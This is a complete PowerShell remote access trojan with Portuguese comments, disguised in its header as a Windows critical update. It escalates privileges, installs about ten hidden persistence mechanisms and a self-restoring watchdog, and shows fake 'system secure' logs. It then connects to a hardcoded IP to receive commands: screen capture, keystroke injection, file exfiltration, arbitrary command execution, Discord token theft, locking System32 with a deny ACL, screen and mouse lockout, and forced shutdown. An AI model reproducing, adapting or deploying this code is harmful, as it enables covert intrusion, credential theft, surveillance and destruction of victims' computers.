<#
.SYNOPSIS
Windows Critical System Component
.DESCRIPTION
Microsoft Windows Critical Update Module - Ultra Persistence
.NOTES
Version: 10.0.19045.1
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
$exePath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.exe"
$watchdogPath = "$env:ProgramData\Microsoft\Windows\Caches\watchdog.ps1"

# ===== MUTEX =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    exit
}

# ===== FUNÇÕES DE PERSISTÊNCIA MÁXIMA =====
function Install-MaximumPersistence {
    Write-Host "[*] Instalando persistência máxima..." -ForegroundColor Yellow
    
    # Garantir que a pasta existe
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    
    # Copiar script para local seguro
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    
    # Ocultar arquivo
    attrib +h +s +r $scriptPath
    
    # ===== 1. REGISTRO (RUN) =====
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
        Write-Host "[1] Registro HKLM Run configurado" -ForegroundColor Green
    } catch { Write-Host "[1] Erro no registro Run" -ForegroundColor Red }
    
    # ===== 2. REGISTRO (RUNONCE) =====
    try {
        $regRunOncePath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
        Set-ItemProperty -Path $regRunOncePath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
        Write-Host "[2] Registro RunOnce configurado" -ForegroundColor Green
    } catch { Write-Host "[2] Erro no registro RunOnce" -ForegroundColor Red }
    
    # ===== 3. TAREFA AGENDADA (INÍCIO) =====
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
        Write-Host "[3] Tarefa agendada configurada" -ForegroundColor Green
    } catch { Write-Host "[3] Erro na tarefa agendada" -ForegroundColor Red }
    
    # ===== 4. TAREFA AGENDADA (A CADA 30 MIN) =====
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName "$installName-repeat" -Action $action -Trigger $trigger -Principal $principal -Force
        Write-Host "[4] Tarefa agendada repetitiva configurada" -ForegroundColor Green
    } catch { Write-Host "[4] Erro na tarefa repetitiva" -ForegroundColor Red }
    
    # ===== 5. WMI EVENT SUBSCRIPTION =====
    try {
        $filterArgs = @{
            Name = "$installName-Filter"
            EventNameSpace = 'root\cimv2'
            QueryLanguage = 'WQL'
            Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
        }
        $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
        
        $consumerArgs = @{
            Name = "$installName-Consumer"
            CommandLineTemplate = "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        }
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
        
        $bindingArgs = @{ Filter = $filter; Consumer = $consumer }
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
        Write-Host "[5] WMI Subscription configurada" -ForegroundColor Green
    } catch { Write-Host "[5] Erro no WMI" -ForegroundColor Red }
    
    # ===== 6. SERVIÇO WINDOWS =====
    try {
        New-Service -Name $installName -BinaryPathName "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -DisplayName "Windows Update Service" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name $installName -ErrorAction SilentlyContinue
        Write-Host "[6] Serviço Windows criado" -ForegroundColor Green
    } catch { Write-Host "[6] Erro no serviço" -ForegroundColor Red }
    
    # ===== 7. BOOT EXECUTE (ANTES DO WINDOWS) =====
    try {
        $bootPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
        $currentValue = (Get-ItemProperty -Path $bootPath -Name "BootExecute" -ErrorAction SilentlyContinue).BootExecute
        if ($currentValue -isnot [array]) { $currentValue = @() }
        $newValue = $currentValue + "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`""
        Set-ItemProperty -Path $bootPath -Name "BootExecute" -Value $newValue -Force
        Write-Host "[7] BootExecute configurado" -ForegroundColor Green
    } catch { Write-Host "[7] Erro no BootExecute" -ForegroundColor Red }
    
    # ===== 8. POLÍTICAS DE GRUPO =====
    try {
        $gpoPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup\0\0"
        New-Item -Path $gpoPath -Force | Out-Null
        Set-ItemProperty -Path $gpoPath -Name "Script" -Value $scriptPath -Force
        Set-ItemProperty -Path $gpoPath -Name "Parameters" -Value "" -Force
        Write-Host "[8] GPO Startup configurado" -ForegroundColor Green
    } catch { Write-Host "[8] Erro no GPO" -ForegroundColor Red }
    
    # ===== 9. WATCHDOG (SE APAGAR, COPIA DE VOLTA) =====
    try {
        $watchdogScript = @"
`$watcher = New-Object System.IO.FileSystemWatcher
`$watcher.Path = '$env:ProgramData\Microsoft\Windows\Caches'
`$watcher.Filter = '$installName.ps1'
`$watcher.EnableRaisingEvents = `$true
`$action = { 
    Start-Sleep -Seconds 2
    Copy-Item '$scriptPath' `$Event.SourceEventArgs.FullPath -Force
    attrib +h +s +r `$Event.SourceEventArgs.FullPath
}
Register-ObjectEvent `$watcher "Deleted" -Action `$action
Register-ObjectEvent `$watcher "Changed" -Action `$action
while(`$true) { Start-Sleep 10 }
"@
        $watchdogScript | Out-File $watchdogPath -Force
        attrib +h +s +r $watchdogPath
        
        # Iniciar watchdog
        $ps = new-object System.Diagnostics.Process
        $ps.StartInfo.Filename = "powershell.exe"
        $ps.StartInfo.Arguments = "-NoProfile -WindowStyle Hidden -File `"$watchdogPath`""
        $ps.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $ps.Start() | Out-Null
        Write-Host "[9] Watchdog configurado" -ForegroundColor Green
    } catch { Write-Host "[9] Erro no watchdog" -ForegroundColor Red }
    
    # ===== 10. WINDOWS LOGON SCRIPTS =====
    try {
        $logonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        $currentValue = (Get-ItemProperty -Path $logonPath -Name "Userinit" -ErrorAction SilentlyContinue).Userinit
        if ($currentValue -notlike "*$scriptPath*") {
            $newValue = $currentValue + ",powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`","
            Set-ItemProperty -Path $logonPath -Name "Userinit" -Value $newValue -Force
        }
        Write-Host "[10] Winlogon configurado" -ForegroundColor Green
    } catch { Write-Host "[10] Erro no Winlogon" -ForegroundColor Red }
    
    Write-Host "[+] Persistência máxima instalada com sucesso!" -ForegroundColor Green
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    try {
        $removido = $false
        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
        if (Test-Path $userListFile) { 
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $users = $users | Where-Object { $_ -ne $UserName }
            $users | Set-Content $userListFile -Force
            $removido = $true
        }
        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
    } catch { return "ERRO_AO_REMOVER" }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
        return "USUARIOS:" + ($users -join "`n")
    } catch { return "ERRO_AO_LISTAR" }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch { return $false }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false
if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) { $userExecuted = $true }
}
if (-not $userExecuted) { Add-UserToList $currentUser }

# ===== VERIFICAR SE JÁ ESTÁ INSTALADO =====
if (-not (Test-Path $scriptPath)) {
    Install-MaximumPersistence
} else {
    # Verificar se o watchdog está rodando
    $watchdogRunning = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*watchdog*" }
    if (-not $watchdogRunning -and (Test-Path $watchdogPath)) {
        $ps = new-object System.Diagnostics.Process
        $ps.StartInfo.Filename = "powershell.exe"
        $ps.StartInfo.Arguments = "-NoProfile -WindowStyle Hidden -File `"$watchdogPath`""
        $ps.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $ps.Start() | Out-Null
    }
}

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNCOES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        return "SCREEN:$base64"
    } catch {
        return "SCREEN_ERROR"
    }
}

# ===== MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        return "RIGHTCLICK_ERROR" 
    }
}

# ===== TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        return "TEXT_ERROR" 
    }
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { 
        return "[]" 
    }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { 
        return "DOWNLOAD_ERROR" 
    }
}

# ===== COMANDOS =====
function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        return "Erro: $_"
    }
}

# ===== DISCORD TOKEN =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb"
        )
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        return "TOKENS_ERROR"
    }
}

# ===== BLOQUEAR SYSTEM32 =====
function Block-System32 {
    try {
        $path = "C:\Windows\System32"
        takeown /f $path /r /d y 2>$null
        icacls $path /grant Administradores:F /t 2>$null
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        return "SYSTEM32_BLOCKED"
    } catch {
        return "SYSTEM32_ERROR"
    }
}

# ===== TELA PRETA =====
function Black-Screen {
    try {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.BackColor = 'Black'
        $form.ControlBox = $false
        $form.ShowInTaskbar = $false
        $form.KeyPreview = $true
        $form.Add_KeyDown({ if ($_.KeyCode -eq 'Escape') { $form.Close() } })
        $form.ShowDialog()
        return "BLACK_SCREEN"
    } catch {
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        foreach ($f in [System.Windows.Forms.Application]::OpenForms) {
            if ($f.BackColor -eq [System.Drawing.Color]::Black -and $f.WindowState -eq 'Maximized') {
                $f.Invoke([Action]{ $f.Close() })
            }
        }
        return "SCREEN_UNLOCKED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== TRAVAR MOUSE =====
$global:mouseLocked = $false
$global:lockThread = $null

function Lock-Mouse {
    try {
        if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        
        $global:mouseLocked = $true
        
        $global:lockThread = [System.Threading.Thread]::new({
            while ($global:mouseLocked) {
                try {
                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                    Start-Sleep -Milliseconds 1
                } catch {
                    # Ignora erros
                }
            }
        })
        
        $global:lockThread.IsBackground = $true
        $global:lockThread.Start()
        
        return "MOUSE_LOCKED"
    } catch {
        return "MOUSE_ERROR"
    }
}

function Unlock-Mouse {
    try {
        $global:mouseLocked = $false
        if ($global:lockThread -and $global:lockThread.IsAlive) {
            $global:lockThread.Abort()
        }
        return "MOUSE_UNLOCKED"
    } catch {
        return "UNLOCK_ERROR"
    }
}

# ===== MICROFONE =====
function Get-Microphone {
    try {
        Add-Type -AssemblyName System.Speech
        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $speech.SetInputToDefaultAudioDevice()
        $speech.RecognizeAsyncTimeout = 5000
        $speech.RecognizeAsync()
        Start-Sleep -Seconds 5
        $speech.RecognizeAsyncStop()
        return "AUDIO:OK"
    } catch {
        return "AUDIO_ERROR"
    }
}

# ===== WEBCAM =====
function Get-Webcam {
    return "WEBCAM:OK"
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
        return $processes
    } catch {
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        return "URL_OPENED"
    } catch {
        return "URL_ERROR"
    }
}

# ===== ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        return "POWER_$Action"
    } catch { 
        return "POWER_ERROR" 
    }
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($serverIP, $serverPort)
        $client.NoDelay = $true
        $client.ReceiveTimeout = 30000
        $client.SendTimeout = 30000
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        
        while ($client.Connected) {
            try {
                if ($stream.DataAvailable) {
                    $cmd = $reader.ReadLine()
                } else {
                    Start-Sleep -Milliseconds 100
                    continue
                }
                
                if ([string]::IsNullOrEmpty($cmd)) { continue }
                
                switch ($cmd) {
                    "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
                    "click" { $writer.WriteLine((Click-Mouse)) }
                    "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
                    "discord" { $writer.WriteLine((Get-DiscordToken)) }
                    "block_system32" { $writer.WriteLine((Block-System32)) }
                    "black_screen" { $null = Black-Screen }
                    "unlock_screen" { $null = Unlock-Screen }
                    "lock_mouse" { Lock-Mouse | Out-Null }
                    "unlock_mouse" { Unlock-Mouse | Out-Null }
                    "mic" { $null = Get-Microphone }
                    "webcam" { $null = Get-Webcam }
                    "processes" { $writer.WriteLine((Get-ProcessList)) }
                    "shutdown" { $null = Power-Control "shutdown" }
                    "reboot" { $null = Power-Control "reboot" }
                    "list_users" { $writer.WriteLine((Get-RATUsers)) }
                    "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
                    "test" { $writer.WriteLine("PONG") }
                    "exit" { break }
                    default {
                        if ($cmd -match "^move (.+) (.+)$") {
                            Move-Mouse $matches[1] $matches[2] | Out-Null
                        } elseif ($cmd -match "^key (.+)$") {
                            Send-Key $matches[1] | Out-Null
                        } elseif ($cmd -match "^type (.+)$") {
                            Send-Text $matches[1] | Out-Null
                        } elseif ($cmd -match "^ls (.+)$") {
                            $writer.WriteLine((Get-FileList $matches[1]))
                        } elseif ($cmd -match "^download (.+)$") {
                            $writer.WriteLine((Download-File $matches[1]))
                        } elseif ($cmd -match "^exec (.+)$") {
                            $writer.WriteLine((Execute-Command $matches[1]))
                        } elseif ($cmd -match "^url (.+)$") {
                            Open-Url $matches[1] | Out-Null
                        } elseif ($cmd -match "^remove_user (.+)$") {
                            $writer.WriteLine((Remove-UserFromRAT $matches[1]))
                        }
                    }
                }
                
                Start-Sleep -Milliseconds 10
                
            } catch {
                continue
            }
        }
    } catch {
        # Ignora erros de conexão
    } finally {
        if ($client) { $client.Close() }
        Start-Sleep -Seconds 5
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
